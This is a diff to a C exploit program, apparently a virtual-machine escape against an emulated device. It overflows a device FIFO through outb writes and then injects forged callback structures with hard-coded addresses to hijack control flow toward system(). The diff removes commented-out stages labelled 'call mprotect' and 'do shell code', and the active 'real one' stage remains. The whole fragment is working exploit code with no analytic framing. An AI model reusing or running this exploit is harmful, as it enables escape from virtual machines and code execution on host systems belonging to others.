@@ -14,25 +14,8 @@
 int main(void){
         unsigned char code[] = {'m','k','t','e','m','p','\0'};
         int len_of_command = sizeof(code)/(sizeof(char));
-        printf("len = %d\n", len_of_command);
-        // //bh1 change dl
-        // char ctx1[8] =   {0x00,0xcc,0x14,0x56,0x55,0x55,0x00,0x00};
-        // char cb1[8] =    {0x3f,0x7a,0x6d,0x55,0x55,0x55,0x00,0x00};
-        // char opaque1[8]= {0x00,0x20,0x20,0x56,0x55,0x55,0x00,0x00};
-        // char next1[8]=   {0xb0,0x2a,0x20,0x56,0x55,0x55,0x00,0x00};
-        // char sid1[8]= {0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
-        // //new bh1   call mprotect 
-        // char ctx2[8] =   {0x00,0xcc,0x14,0x56,0x55,0x55,0x00,0x00};
-        // char cb2[8] =    {0x20,0xea,0x3d,0xf6,0xff,0x7f,0x00,0x00};
-        // char opaque2[8]= {0x00,0x20,0x20,0x56,0x55,0x55,0x00,0x00};
-        // char next2[8]=   {0xd8,0x2a,0x20,0x56,0x55,0x55,0x00,0x00};
-        // char sid2[8]= {0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
-        // //bh2 do shell code
-        // char ctx3[8] =   {0x00,0xcc,0x14,0x56,0x55,0x55,0x00,0x00};
-        // char cb3[8] =    {0x00,0x26,0x20,0x56,0x55,0x55,0x00,0x00};
-        // char opaque3[8]= {0x40,0xa5,0x1c,0x56,0x55,0x55,0x00,0x00};
-        // char next3[8]=   {0xc0,0x45,0x1d,0x56,0x55,0x55,0x00,0x00};
-        // char sid3[8]= {0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+        // printf("len = %d\n", len_of_command);
+        
 
          //original bh  try to system and don't change the flow after that, make next the original next
         char ctx[8] =   {0x00,0xcc,0x14,0x56,0x55,0x55,0x00,0x00};
@@ -59,54 +42,7 @@ int main(void){
         for(i=0; i<j; i++){
             outb(TEST_VAL, FIFO);
         }
-        //start to create bh struct
-        // for(i=0; i< 8; i++){
-        //     outb(ctx1[i], FIFO);
-        // }
-        // for(i=0; i< 8; i++){
-        //     outb(cb1[i], FIFO);
-        // }
-        // for(i=0; i< 8; i++){
-        //     outb(opaque1[i], FIFO);
-        // }
-        // for(i=0; i< 8; i++){
-        //     outb(next1[i], FIFO);
-        // }
-        // for(i=0; i< 8; i++){
-        //     outb(sid1[i], FIFO);
-        // }
-        // //second one
-        // for(i=0; i< 8; i++){
-        //     outb(ctx2[i], FIFO);
-        // }
-        // for(i=0; i< 8; i++){
-        //     outb(cb2[i], FIFO);
-        // }
-        // for(i=0; i< 8; i++){
-        //     outb(opaque2[i], FIFO);
-        // }
-        // for(i=0; i< 8; i++){
-        //     outb(next2[i], FIFO);
-        // }
-        // for(i=0; i< 8; i++){
-        //     outb(sid2[i], FIFO);
-        // }
-        // //third one
-        // for(i=0; i< 8; i++){
-        //     outb(ctx3[i], FIFO);
-        // }
-        // for(i=0; i< 8; i++){
-        //     outb(cb3[i], FIFO);
-        // }
-        // for(i=0; i< 8; i++){
-        //     outb(opaque3[i], FIFO);
-        // }
-        // for(i=0; i< 8; i++){
-        //     outb(next3[i], FIFO);
-        // }
-        // for(i=0; i< 8; i++){
-        //     outb(sid3[i], FIFO);
-        // }
+        
         //real one
          for(i=0; i< 8; i++){
             outb(ctx[i], FIFO);
